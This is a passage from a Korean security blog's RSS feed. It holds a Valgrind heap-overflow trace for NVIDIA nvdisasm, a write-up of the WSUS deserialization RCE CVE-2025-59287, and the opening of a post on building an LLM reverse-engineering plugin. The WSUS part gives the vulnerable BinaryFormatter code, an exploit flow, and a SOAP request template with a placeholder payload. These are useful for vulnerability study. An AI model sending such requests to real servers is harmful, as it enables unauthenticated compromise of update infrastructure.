class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x39</span>, buffer size: <span class="hljs-number">0x70</span>, assumed size: <span class="hljs-number">0x80</span>...</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158; <code>sh_size</code> &#xAC12;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD574; heap overflow&#xB85C; &#xC778;&#xD574; RCE&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">==<span class="hljs-number">152542</span>== Memcheck, a memory error detector==152542== Copyright (C) 2002-2024, and GNU GPL&apos;d, by Julian Seward et al. ==<span class="hljs-number">152542</span>== Using Valgrind<span class="hljs-number">-3.23</span><span class="hljs-number">.0</span> <span class="hljs-keyword">and</span> LibVEX; rerun with -h <span class="hljs-keyword">for</span> copyright info==<span class="hljs-number">152542</span>== Command: ./nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span> ./ac0bcb07==<span class="hljs-number">152542</span>== Parent PID: <span class="hljs-number">132852</span>==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== Invalid write of size <span class="hljs-number">8</span>==<span class="hljs-number">152542</span>==    at <span class="hljs-number">0x45C7B1</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45CEA5</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40307A</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x48A21C9</span>: (below main) (libc_start_call_main.h:<span class="hljs-number">58</span>)==<span class="hljs-number">152542</span>==  Address <span class="hljs-number">0x4a99368</span> is <span class="hljs-number">0</span> bytes after a block of size <span class="hljs-number">184</span> alloc<span class="hljs-number">&apos;</span>d==<span class="hljs-number">152542</span>==    at <span class="hljs-number">0x484680F</span>: <span class="hljs-built_in">malloc</span> (vg_replace_malloc.c:<span class="hljs-number">446</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x465719</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40A999</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45C6AD</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45CEA5</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40307A</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x48A21C9</span>: (below main) (libc_start_call_main.h:<span class="hljs-number">58</span>)==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== HEAP SUMMARY:==<span class="hljs-number">152542</span>==     in use at <span class="hljs-built_in">exit</span>: <span class="hljs-number">24</span>,<span class="hljs-number">556</span> bytes in <span class="hljs-number">154</span> blocks==<span class="hljs-number">152542</span>==   total heap usage: <span class="hljs-number">228</span> allocs, <span class="hljs-number">74</span> frees, <span class="hljs-number">39</span>,<span class="hljs-number">566</span> bytes allocated==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== LEAK SUMMARY:==<span class="hljs-number">152542</span>==    definitely lost: <span class="hljs-number">248</span> bytes in <span class="hljs-number">8</span> blocks==<span class="hljs-number">152542</span>==    indirectly lost: <span class="hljs-number">8</span>,<span class="hljs-number">062</span> bytes in <span class="hljs-number">123</span> blocks==<span class="hljs-number">152542</span>==      possibly lost: <span class="hljs-number">16</span>,<span class="hljs-number">246</span> bytes in <span class="hljs-number">23</span> blocks==<span class="hljs-number">152542</span>==    still reachable: <span class="hljs-number">0</span> bytes in <span class="hljs-number">0</span> blocks==<span class="hljs-number">152542</span>==         suppressed: <span class="hljs-number">0</span> bytes in <span class="hljs-number">0</span> blocks==<span class="hljs-number">152542</span>== Rerun with --leak-check=full to see details of leaked memory==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== For lists of detected <span class="hljs-keyword">and</span> suppressed errors, rerun with: -s==<span class="hljs-number">152542</span>== ERROR SUMMARY: <span class="hljs-number">2</span> errors from <span class="hljs-number">1</span> contexts (suppressed: <span class="hljs-number">0</span> from <span class="hljs-number">0</span>)</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/NVIDIA/">NVIDIA</category>
      
      <category domain="https://hackyboiz.github.io/tags/nvdisasm/">nvdisasm</category>
      
      <category domain="https://hackyboiz.github.io/tags/ELF/">ELF</category>
      
      <category domain="https://hackyboiz.github.io/tags/reloc/">.reloc</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-59287: WSUS(Windows Server Update Services)의 인증되지 않은 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/</link>
      <guid>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/</guid>
      <pubDate>Sun, 02 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerabili</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>WSUS&#xAC00; &#xC124;&#xCE58; &#xBC0F; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC11C;&#xBC84;&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;</p><ul><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server 2022</li><li>Windows Server 2025</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Server Update Services(WSUS)&#xB294; &#xAE30;&#xC5C5; &#xD658;&#xACBD;&#xC5D0;&#xC11C; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC758; &#xC2B9;&#xC778;, &#xBC30;&#xD3EC;, &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xC744; &#xC911;&#xC559;&#xC5D0;&#xC11C; &#xB2F4;&#xB2F9;&#xD558;&#xB294; &#xC778;&#xD504;&#xB77C; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. CVE-2025-59287&#xC740; WSUS&#xC758; &#xC6F9; &#xBCF4;&#xACE0;&amp;&#xAD00;&#xB9AC; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC804;&#xC1A1;&#xB41C; &#xC9C1;&#xB82C;&#xD654;(serialized) &#xB370;&#xC774;&#xD130;&#xB97C; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; .NET &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;(deserialization)&#xB97C; &#xC218;&#xD589;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; GetCookie() &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC804;&#xC1A1;&#xB41C; AuthorizationCookie &#xAC1D;&#xCCB4;&#xC758; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. WSUS&#xC758; <code>Microsoft.UpdateServices.Internal.Authorization.EncryptionHelper.DecryptData()</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xCDA9;&#xBD84;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>BinaryFormatter.Deserialize()</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xC5EC; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">else</span>{    BinaryFormatter binaryFormatter = <span class="hljs-keyword">new</span> BinaryFormatter();    MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(<span class="hljs-built_in">array</span>);    <span class="hljs-keyword">try</span>    {        obj = binaryFormatter.Deserialize(memoryStream); <span class="hljs-comment">// [1]</span>    }    <span class="hljs-keyword">catch</span> (Exception ex2)    <span class="hljs-comment">// ...</span>    <span class="hljs-keyword">if</span> (obj.GetType() != <span class="hljs-keyword">this</span>.classType) <span class="hljs-comment">// [2]</span>    {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> LoggedArgumentException(<span class="hljs-string">&quot;Decrypted cookie has the wrong data type. Expected type = &quot;</span> + <span class="hljs-keyword">this</span>.classType.ToString() + <span class="hljs-string">&quot;, actual type = &quot;</span> + obj.GetType().ToString(), <span class="hljs-string">&quot;cookieData&quot;</span>);    }}<span class="hljs-keyword">return</span> obj;</code></pre><p>[1] &#xC704; &#xACFC;&#xC815;&#xC740; &#xBCF5;&#xD638;&#xD654;&#xB41C; &#xCFE0;&#xD0A4; &#xBC14;&#xC774;&#xD2B8;(array)&#xB97C; MemoryStream&#xC5D0; &#xB2F4;&#xC544; <code>BinaryFormatter.Deserialize()</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; [2] &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xD0C0;&#xC785; &#xAC80;&#xC0AC;&#xAC00; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xD6C4;&#xC5D0; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; <code>soserial.net</code>&#xACFC; &#xAC19;&#xC740; &#xB3C4;&#xAD6C;&#xB85C; &#xAC00;&#xC82F; &#xCCB4;&#xC778; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; <code>BinaryFormatter</code>&#xB85C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB420; &#xB54C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC545;&#xC6A9;&#xC740; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><p>&#xCDE8;&#xC57D;&#xC810; &#xD750;&#xB984;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>1) &#xC870;&#xC791;&#xB41C; SOAP &#xC694;&#xCCAD; &#xC804;&#xC1A1;</p><p>&#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xAC00; WSUS&#xC758; SOAP&#xC758; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; <code>/ClientWebService/Client.asmx</code> &#xB85C; &#xC870;&#xC791;&#xB41C; &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC694;&#xCCAD; &#xD5E4;&#xB354;&#xC5D0;&#xB294; <code>SOAPAction: &#x201C;&#x2026;/GetCookie&quot;</code> &#xB4F1;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">POST /ClientWebService/Client.asmx HTTP/<span class="hljs-number">1.1</span>Host: WSUS-SERVER:<span class="hljs-number">8530</span>Content-Type: text/xml; charset=utf<span class="hljs-number">-8</span>SOAPAction: <span class="hljs-string">&quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie&quot;</span>Content-Length: <span class="hljs-number">3632</span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;  &lt;soap:Body&gt;    &lt;GetCookie xmlns=<span class="hljs-string">&quot;http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService&quot;</span>&gt;      &lt;authCookies&gt;        &lt;AuthorizationCookie&gt;          &lt;PlugInId&gt;SimpleTargeting&lt;/PlugInId&gt;          &lt;CookieData&gt;[GENERATED PAYLOAD]&lt;/CookieData&gt;        &lt;/AuthorizationCookie&gt;      &lt;/authCookies&gt;      &lt;oldCookie xsi:nil=<span class="hljs-string">&quot;true&quot;</span> xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>/&gt;      &lt;protocolVersion&gt;1.20&lt;/protocolVersion&gt;    &lt;/GetCookie&gt;  &lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</code></pre><p>2) AuthorizationCookie &#xC548;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC; &#xC0BD;&#xC785;</p><p>&#xC694;&#xCCAD;&#xC758; &#xBCF8;&#xBB38;&#xC5D0; <code>AuthorizationCookie</code>&#xC758; <code>CookieData</code> &#xD544;&#xB4DC;&#xC5D0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; Base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xD6C4; AES-128-CBC&#xB85C; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xC804;&#xC1A1;&#xB429;&#xB2C8;&#xB2E4;.</p><p>3) &#xC11C;&#xBC84;&#xC758; &#xC694;&#xCCAD; &#xC218;&#xC2E0; &#x2192; &#xCC98;&#xB9AC;</p><p>&#xD574;&#xB2F9; &#xC694;&#xCCAD;&#xC740; <code>AuthorizationManager.GetCookie</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xACE0;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>CrackAuthorizationCookies</code> &#x2192; <code>CrackAuthorizationCookie</code> &#xD638;&#xCD9C; &#xACBD;&#xB85C;&#xB97C; &#xB530;&#xB77C; <code>EncryptionHelper.DecryptData()</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>4) &#xBCF5;&#xD638;&#xD654; &#xB2E8;&#xACC4;</p><p>DecryptData()&#xB294; &#xD558;&#xB4DC;&#xCF54;&#xB529;&#xB41C; AES&#xD0A4;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>5) &#xC5ED;&#xC9C1;&#xB82C;&#xD654;</p><p>&#xBCF5;&#xD638;&#xD654;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xB294; <code>MemoryStream</code>&#xC73C;&#xB85C; &#xAC10;&#xC2F8;&#xC838; &#xBC14;&#xB85C; <code>BinaryFormatter.Deserialize()</code>&#xC5D0; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xC9C0;&#xC810;&#xC5D0;&#xC11C; <code>BinaryFormatter</code>&#xB294; &#xBC14;&#xC774;&#xD2B8; &#xC2A4;&#xD2B8;&#xB9BC;&#xC758; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xAC1D;&#xCCB4;&#xB97C; &#xBCF5;&#xC6D0;&#xD558;&#xACE0; &#xC0DD;&#xC131;&#xC790;, <code>ISerializable</code> &#xD6C4;&#xD06C;&#xB7;<code>OnDeserialized</code> &#xAC19;&#xC740; &#xCF5C;&#xBC31;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xD6C4;&#xC5D0; obj.GetType()&#xC73C;&#xB85C; &#xD0C0;&#xC785;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xBBC0;&#xB85C;, &#xC774;&#xBBF8; &#xC77C;&#xC5B4;&#xB09C; &#xC545;&#xC131; &#xB3D9;&#xC791;&#xC744; &#xCC28;&#xB2E8;&#xD558;&#xC9C0; &#xBABB;&#xD569;&#xB2C8;&#xB2E4;.</p><p>6) &#xAC00;&#xC82F; &#xCCB4;&#xC778; &#xC2E4;&#xD589; &#x2192; RCE</p><p>&#xACF5;&#xACA9;&#xC790;&#xC758; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB294; &#xC11C;&#xBC84;&#xC758; &#xAC00;&#xC82F;&#xCCB4;&#xC778;&#xC744; &#xC545;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74;,<br>WSUS &#xD504;&#xB85C;&#xC138;&#xC2A4;(<code>wsusservice.exe</code> &#xB610;&#xB294; <code>w3wp.exe</code>)&#xAC00; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0;&#xC11C; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; PoC&#xB294; &#xCC3E;&#xC544;&#xBCFC; &#xC218; &#xC788;&#xC9C0;&#xB9CC;, &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h3><p>Microsoft&#xB294; CVE-2025-59287&#xACFC; &#xAD00;&#xB828;&#xD55C; &#xBCF4;&#xC548; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC73C;&#xB098;, &#xCD08;&#xAE30; &#xD328;&#xCE58;&#xAC00; &#xC644;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xCD94;&#xAC00; &#xAE34;&#xAE09; &#xD328;&#xCE58;&#xAC00; &#xBC30;&#xD3EC;&#xB418;&#xC5C8;&#xACE0; &#xC2E4;&#xC81C; &#xACF5;&#xACA9; &#xC2DC;&#xB3C4;/&#xC545;&#xC6A9;&#xC774; &#xBCF4;&#xACE0;&#xB418;&#xC5B4; &#xC989;&#xC2DC; &#xD328;&#xCE58; &#xC801;&#xC6A9; &#xBC0F; &#xD3EC;&#xD2B8; &#xC644;&#xD654; &#xC870;&#xCE58;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://socprime.com/blog/cve-2025-59287-detection">https://socprime.com/blog/cve-2025-59287-detection</a></p><p><a href="https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerability">https://www.picussecurity.com/resource/blog/cve-2025-59287-explained-wsus-unauthenticated-rce-vulnerabili</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-59287/">CVE-2025-59287</category>
      
      <category domain="https://hackyboiz.github.io/tags/WSUS/">WSUS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Deserialization/">Deserialization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Newbie Developer&#39;s Service Development Journey using AI Services Part 1</title>
      <link>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/en/</guid>
      <pubDate>Thu, 30 Oct 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg&quot; alt=&quot;index_img&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;0-What-happened&amp;#x2026;&quot;&gt;&lt;a href=&quot;#0-What-ha</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/30/j0ker/service_dev_part1/en/thumbnail.jpg" alt="index_img"></p><h1 id="0-What-happened&#x2026;"><a href="#0-What-happened&#x2026;" class="headerlink" title="0. What happened&#x2026;"></a>0. What happened&#x2026;</h1><p>Haha, it&#x2019;s j0ker! Why&#x2019;s it been so long since I last wrote? When was my last post&#x2026; Ah, August&#x2026; Haha&#x2026; Please save me&#x2026; Next time I&#x2019;ll try to write something more interesting&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/joker.png" alt="image.png"></p><p>Today, unlike my previous research posts, I&#x2019;d like to briefly discuss a project I developed.</p><p>On August 30th, the 31st Hacking Camp took place. About two weeks prior, I suddenly received a call from the organizers&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/en/kakao.png" alt="&#x1112;&#x1162;&#x110F;&#x1175;&#x11BC;&#x110F;&#x1162;&#x11B7;&#x1111;&#x1173; &#x1109;&#x1165;&#x11B8;&#x110B;&#x116C;.png"></p><p>Well&#x2026; the original presenter suddenly contacted us saying they couldn&#x2019;t make it, so we had to find a replacement. I was planning to go on the second day, listen to the mentee presentations, and then grab drinks with the organizers in the evening&#x2026; but I ended up giving the presentation lol. So I prepared for it and had about a week to spare&#x2026; but I&#x2019;m a pro at creating work for myself, so I wanted to do something extra.</p><h1 id="1-Planning-Begins"><a href="#1-Planning-Begins" class="headerlink" title="1. Planning Begins"></a>1. Planning Begins</h1><p>To give a quick update, I recently co-founded a startup called L0ch and Hacky-AI, where we&#x2019;re developing security solutions. (If you&#x2019;re interested, please visit our <a href="https://hacky-ai.com/">website</a>!) I believe the most crucial aspect of running a startup is identifying customer problems and proposing solutions. There are plenty of other things to worry about too&#x2026; Anyway, that&#x2019;s why I thought, &#x201C;Why not create something simple that people attending presentations need?&#x201D;</p><p>Since I&#x2019;m also building solutions, I&#x2019;ve become very interested in development using AI services. At this point, the things I wanted to stick to as much as possible were:</p><ol><li>Don&#x2019;t write the code myself; let the AI services write it all.</li><li>We only have a week, so just make it work.</li><li>Build a service people actually need.</li></ol><p>Hacking Camp runs a CTF on the first evening. My assumption was that most participants were just starting out with hacking and probably weren&#x2019;t very familiar with reverse engineering yet! So, wouldn&#x2019;t it be great to develop a reverse engineering assistant tool? I figured I could probably build something like that by investing about three days on my own. (But this was arrogance.) More specifically, I thought I could use an LLM to rename variables and functions to more readable names, and even analyze function contents with an LLM to add comments. (It&#x2019;s been over a year since I last opened IDA, so I realized while building this that such tools already exist as open source&#x2026; haha. Well, the point was for me to try building a service anyway.)</p><p>A simplified service flowchart would look like this:</p><pre><code class="hljs less">&#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;                &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;&#x2502;   <span class="hljs-selector-tag">IDA</span> <span class="hljs-selector-tag">Pro</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">FastAPI</span>       &#x2502;&#x25C4;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x25BA;&#x2502;   <span class="hljs-selector-tag">Ollama</span>        &#x2502;&#x2502;   &#xD50C;&#xB7EC;&#xADF8;&#xC778;        &#x2502;                &#x2502;   &#xC11C;&#xBC84;           &#x2502;                &#x2502;   <span class="hljs-selector-tag">LLM</span> &#xC11C;&#xBC84;       &#x2502;&#x2502; (Python)        &#x2502;                &#x2502; (Python)        &#x2502;                &#x2502;                 &#x2502;&#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                &#x2514;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2518;                                            &#x2502;                                   &#x2502;                                            &#x25BC;                                   &#x25BC;                                    &#x250C;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2510;               